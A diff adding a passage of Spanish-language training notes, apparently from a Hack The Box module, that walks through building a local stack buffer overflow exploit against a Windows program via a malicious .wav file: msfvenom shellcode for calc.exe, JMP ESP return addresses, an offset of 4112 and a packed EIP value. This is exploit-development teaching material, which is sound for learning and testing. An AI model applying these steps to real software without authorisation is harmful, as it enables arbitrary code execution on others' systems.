@@ -357,6 +357,69 @@ Primero, podemos enumerar todas las cargas útiles disponibles para `Windows 32
 ```
 
 
+Para realizar pruebas iniciales, intentemos `windows/exec` ejecutar la operación `calc.exe` para abrir la calculadora de Windows si nuestro exploit tiene éxito. Para ello, utilizaremos `CMD=calc.exe`, `-f 'python'` ya que estamos utilizando un exploit de Python, y `-b` para especificar los caracteres incorrectos:
+
+```shell-session
+0xRh4ps00dy@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
+
+...SNIP...
+buf =  b""
+buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
+buf += b"\xc9\xb1\x31\x31\x50\x18\x03\x50\x18\x83\xc0\x39\x29"
+buf += b"\x6b\xd4\xa9\x2f\x94\x25\x29\x50\x1c\xc0\x18\x50\x7a"
+...SNIP...
+```
+
+
+Copiar la `buf` variable en nuestro exploit, donde ahora definiremos la función final `def exploit()`, que será nuestro código de exploit principal:
+
+```python
+def exploit():
+    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
+    buf =  b""
+    buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
+    ...SNIP...
+    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"
+```
+
+### La carga útil final
+
+Ahora que tenemos nuestro shellcode, podemos escribir la carga útil final que escribiremos en el `.wav`archivo que se abrirá en nuestro programa. Hasta ahora, sabemos lo siguiente:
+
+1. `buffer`:Podemos llenar el buffer escribiendo`b"A"*offset`
+2. `EIP`:Los siguientes 4 bytes deberían ser nuestra dirección de retorno
+3. `buf`:Después de eso, podemos agregar nuestro shellcode
+
+En la sección anterior, encontramos múltiples direcciones de retorno que pueden funcionar al ejecutar cualquier código shell que escribamos en la pila:
+
+|`ESP`|`JMP ESP`|`PUSH ESP; RET`|
+|---|---|---|
+|`0014F974`|`00419D0B`|`0047D4F5`|
+|-|`00463B91`|`00483D0E`|
+|-|`00477A8B`|-|
+|-|`0047E58B`|-|
+|-|`004979F4`|-|
+
+Cualquiera de estos debería funcionar para ejecutar el código shell que escribimos en la pila (siéntete libre de probar algunos de ellos). Comenzaremos con el más confiable, `JMP ESP`, y elegiremos la primera dirección `00419D0B`y la escribiremos como nuestra dirección de retorno.
+
+Para convertirlo `hex`en una dirección en Little Endian, utilizaremos una función de Python llamada que `pack`se encuentra en la `struct`biblioteca. Podemos importar esta función agregando la siguiente línea al comienzo de nuestro código:
+
+Código: python
+
+```python
+from struct import pack
+```
+
+Ahora podemos usar `pack`para convertir nuestra dirección a su formato adecuado y usar ' `<L`' para especificar que la queremos en formato Little Endian:
+
+Código: python
+
+```python
+    offset = 4112
+    buffer = b"A"*offset
+    eip = pack('<L', 0x00419D0B)
+```
+
 
 
 # Remote Buffer Overflow
